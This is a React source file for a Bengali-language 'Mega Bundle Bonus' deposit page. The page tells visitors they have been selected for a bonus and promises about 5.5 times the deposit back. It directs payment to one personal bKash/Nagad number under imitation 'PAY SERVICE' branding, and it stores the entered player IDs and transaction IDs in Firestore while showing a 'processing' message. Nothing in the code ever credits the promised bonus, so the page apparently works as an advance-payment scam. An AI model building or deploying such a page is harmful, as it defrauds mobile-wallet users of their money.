import React, { useState } from "react";
import "./App.css";
import { initializeApp } from "firebase/app";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
} from "firebase/firestore";

// Your Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyA3yNMfCpxhT0q6mp6CqhaDlIC9bBbV67E",
  authDomain: "bundlebonus404.firebaseapp.com",
  projectId: "bundlebonus404",
  storageBucket: "bundlebonus404.firebasestorage.app",
  messagingSenderId: "874215248628",
  appId: "1:874215248628:web:419222a756206ead8084a1",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const App = () => {
  const [page, setPage] = useState(1);
  const [playerID, setPlayerID] = useState("");
  const [selectedBundle, setSelectedBundle] = useState(null);
  const [walletProvider, setWalletProvider] = useState("bkash");
  const [trxID, setTrxID] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Bundle data
  const bundles = [
    { deposit: 300, bonus: 1650 },
    { deposit: 500, bonus: 2750 },
    { deposit: 800, bonus: 4400 },
    { deposit: 1000, bonus: 5500 },
  ];

  // Wallet numbers by provider
  const walletNumbers = {
    bkash: "01825024447",
    nagad: "01825024447",
  };

  // Get wallet number based on provider
  const getWalletNumber = () => {
    return walletNumbers[walletProvider] || walletNumbers.bkash;
  };

  // Get logo path based on provider
  const getLogoPath = () => {
    return walletProvider === "bkash" ? "./bkash.png" : "./nagad.png";
  };

  // Get provider box color based on provider
  const getProviderBoxColor = () => {
    return walletProvider === "bkash" ? "#c800a1" : "#f24f40";
  };

  // Get deposit amount from selected bundle
  const getDepositAmount = () => {
    if (selectedBundle !== null) {
      return bundles[selectedBundle].deposit.toFixed(2);
    }
    return "100.00"; // Default fallback
  };

  const formatNumber = (num) => {
    return num.toLocaleString("bn-BD");
  };

  // TRANSLATION DICTIONARY
  const t = {
    bn: {
      doNotCashout: "কম বা বেশি সেন্ড মানি করবেন না",
      warningMain: `আপনি যদি টাকার পরিমাণ পরিবর্তন করেন (BDT ${getDepositAmount()}), আপনি ক্রেডিট পেতে সক্ষম হবেন না।`,
      walletNo: "Wallet No",
      walletDesc:
        walletProvider === "bkash"
          ? "এই BKASH নাম্বারে শুধুমাত্র সেন্ড মানি গ্রহণ করা হয়"
          : "এই NAGAD নাম্বারে শুধুমাত্র সেন্ড মানি গ্রহণ করা হয়",
      walletProvider: "Wallet Provider",
      depositName:
        walletProvider === "bkash" ? "BKASH Deposit" : "NAGAD Deposit",
      trxLabel: "সেন্ড মানির TrxID নাম্বারটি লিখুন",
      required: " (প্রয়োজন)",
      placeholder: "TrxID অবশ্যই পূরণ করতে হবে!",
      confirm: "নিশ্চিত",
      warningTitle: "সতর্কতা:",
      warningText1:
        "লেনদেন আইডি সঠিকভাবে পূরণ করতে হবে, অন্যথায় স্কোর ব্যর্থ হবে!!",
      warningText2:
        walletProvider === "bkash"
          ? "অনুগ্রহ করে নিশ্চিত হয়ে নিন যে আপনি BKASH deposit ওয়ালেট নাম্বারে সেন্ড মানি করছেন। এই নাম্বারে অন্য কোন ওয়ালেট থেকে সেন্ড মানি করলে সেই টাকা পাওয়ার কোন সম্ভাবনা নাই"
          : "অনুগ্রহ করে নিশ্চিত হয়ে নিন যে আপনি NAGAD deposit ওয়ালেট নাম্বারে সেন্ড মানি করছেন। এই নাম্বারে অন্য কোন ওয়ালেট থেকে সেন্ড মানি করলে সেই টাকা পাওয়ার কোন সম্ভাবনা নাই",
      payService: "SERVICE",
    },
    en: {
      doNotCashout: "Do not Send money more or less",
      warningMain: `If you change the amount (BDT ${getDepositAmount()}), you will not be able to receive credit.`,
      walletNo: "Wallet No",
      walletDesc:
        walletProvider === "bkash"
          ? "Only Send money is accepted on this BKASH number"
          : "Only Send money is accepted on this NAGAD number",
      walletProvider: "Wallet Provider",
      depositName:
        walletProvider === "bkash" ? "BKASH Deposit" : "NAGAD Deposit",
      trxLabel: "Enter Cashout TrxID Number",
      required: "(Required)",
      placeholder: "TrxID must be filled!",
      confirm: "Confirm",
      warningTitle: "Warning:",
      warningText1:
        "Transaction ID must be filled correctly, otherwise the score will fail!!",
      warningText2:
        walletProvider === "bkash"
          ? "Please ensure that you are cashing out to the BKASH deposit wallet number. If you Send money from any other wallet to this number, there is no possibility of receiving that money."
          : "Please ensure that you are cashing out to the NAGAD deposit wallet number. If you Send money from any other wallet to this number, there is no possibility of receiving that money.",
      payService: "SERVICE",
    },
  };

  const [language, setLanguage] = useState("bn");
  const text = t[language];

  const handleCopy = () => {
    navigator.clipboard.writeText(getWalletNumber());
  };

  const handleDeposit = () => {
    if (playerID && selectedBundle !== null) {
      setPage(2);
    } else {
      alert("অনুগ্রহ করে সকল তথ্য পূরণ করুন");
    }
  };

  const handleSubmit = async () => {
    if (!trxID) {
      alert("অনুগ্রহ করে ট্রানজেকশন আইডি দিন");
      return;
    }

    if (!playerID || selectedBundle === null || !walletProvider) {
      alert("অনুগ্রহ করে সকল তথ্য পূরণ করুন");
      return;
    }

    setIsSubmitting(true);

    try {
      // Create data object
      const data = {
        playerID: playerID,
        trxID: trxID,
        depositAmount: bundles[selectedBundle].deposit,
        timestamp: serverTimestamp(),
        walletNumber: getWalletNumber(),
        walletProvider: walletProvider,
      };

      // Save to Firestore
      const docRef = await addDoc(collection(db, "DepositData"), data);
      console.log("Document written with ID: ", docRef.id);

      // Show success popup
      setShowPopup(true);

      // Reset form after 3 seconds and go back to page 1
      setTimeout(() => {
        setShowPopup(false);
        setPage(1);
        setPlayerID("");
        setSelectedBundle(null);
        setWalletProvider("bkash");
        setTrxID("");
        setIsSubmitting(false);
      }, 3000);
    } catch (error) {
      console.error("Error adding document: ", error);
      alert("একটি সমস্যা হয়েছে, আবার চেষ্টা করুন: " + error.message);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="app-container">
      {page === 1 ? (
        <div className="page page-1">
          <div className="content-wrapper">
            <h1 className="welcome-text">
              <span className="bold">স্বাগতম,</span> মেগা বান্ডেল বোনাসের জন্য
              আপনাকে নির্বাচিত করা হয়েছে।
            </h1>

            <div className="form-section">
              <label className="input-label">আইডির নাম অথবা ফোন নম্বর</label>
              <input
                type="text"
                className="text-input"
                value={playerID}
                onChange={(e) => setPlayerID(e.target.value)}
                placeholder="আপনার আইডি অথবা ফোন নম্বর লিখুন "
              />
            </div>

            <div className="offers-section">
              <h2 className="offers-title">Mega Bundle Offer:</h2>

              <div className="radio-group">
                {bundles.map((bundle, index) => (
                  <label key={index} className="radio-option">
                    <input
                      type="radio"
                      name="bundle"
                      value={index}
                      checked={selectedBundle === index}
                      onChange={() => setSelectedBundle(index)}
                    />
                    <div className="radio-content">
                      <span className="radio-text">
                        {formatNumber(bundle.deposit)} ডিপোজিটে
                      </span>
                      <span className="bonus-text">
                        বোনাস {formatNumber(bundle.bonus)}
                      </span>
                    </div>
                  </label>
                ))}
              </div>
            </div>

            {/* Wallet Provider Selection on Page 1 */}
            <div className="form-section">
              <label className="input-label">
                ওয়ালেট প্রোভাইডার নির্বাচন করুন
              </label>
              <div className="provider-options">
                <label className="provider-option">
                  <input
                    type="radio"
                    name="provider"
                    value="bkash"
                    checked={walletProvider === "bkash"}
                    onChange={() => setWalletProvider("bkash")}
                  />
                  <div className="provider-content">
                    <img src="./bkash.png" className="provider-logo" />
                    <span className="provider-name">bKash</span>
                  </div>
                </label>
                <label className="provider-option">
                  <input
                    type="radio"
                    name="provider"
                    value="nagad"
                    checked={walletProvider === "nagad"}
                    onChange={() => setWalletProvider("nagad")}
                  />
                  <div className="provider-content">
                    <img src="./nagad.png" className="provider-logo" />
                    <span className="provider-name">Nagad</span>
                  </div>
                </label>
              </div>
            </div>

            <button className="deposit-button" onClick={handleDeposit}>
              ডিপোজিট করুন
            </button>
          </div>
        </div>
      ) : (
        <div className="page page-2">
          <div className="payment-container">
            <div className="header">
              <div className="header-content">
                <div className="amount-section">
                  <h1>BDT {getDepositAmount()}</h1>
                  <p>{text.doNotCashout}</p>
                </div>
                <div className="logo-section">
                  <div className="service-tag">
                    <span className="pay-badge">PAY</span>
                    <span className="service-text">{text.payService}</span>
                  </div>
                  <div className="lang-switch">
                    <button
                      className={language === "en" ? "active" : ""}
                      onClick={() => setLanguage("en")}
                    >
                      EN
                    </button>
                    <button
                      className={language === "bn" ? "active" : ""}
                      onClick={() => setLanguage("bn")}
                    >
                      বাং
                    </button>
                  </div>
                </div>
              </div>
            </div>

            <div className="body-content">
              <p className="main-warning">{text.warningMain}</p>

              <div className="info-grid">
                <div className="info-block wallet-section">
                  <label className="input-label">
                    <div className="walletNo">
                      {text.walletNo}
                      <span className="red">*</span>
                    </div>
                  </label>
                  <p className="sub-label">{text.walletDesc}</p>

                  <div className="copy-box">
                    <span>{getWalletNumber()}</span>
                    <button className="copy-btn" onClick={handleCopy}>
                      <img src="./copy.png" alt="Copy" />
                    </button>
                  </div>
                </div>
                <div className="info-block provider-section">
                  <label className="input-label">{text.walletProvider}</label>
                  <div
                    className="provider-box"
                    style={{ backgroundColor: getProviderBoxColor() }}
                  >
                    <div className="logo-circle">
                      <img src={getLogoPath()} alt={walletProvider} />
                    </div>
                    <span>{text.depositName}</span>
                  </div>
                </div>
              </div>

              <div className="trx-section">
                <label className="input-label">
                  {text.trxLabel}
                  <span className="red">{text.required}</span>
                </label>
                <input
                  type="text"
                  className="trx-input"
                  placeholder={text.placeholder}
                  value={trxID}
                  onChange={(e) => setTrxID(e.target.value)}
                  disabled={isSubmitting}
                />
              </div>

              <button
                className="confirm-btn"
                onClick={handleSubmit}
                disabled={isSubmitting}
              >
                {isSubmitting ? "সাবমিট হচ্ছে..." : text.confirm}
              </button>

              <div className="footer-warning">
                <span>{text.warningTitle}</span>
                <p className="red-text">{text.warningText1}</p>
                <p className="gray-text">{text.warningText2}</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {showPopup && (
        <div className="popup-overlay">
          <div className="popup">
            <div className="popup-icon">✓</div>
            <h2 className="popup-text">ধন্যবাদ! তথ্য সেভ হয়েছে</h2>
            <p>আপনার ডিপোজিট প্রসেসিং হচ্ছে...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
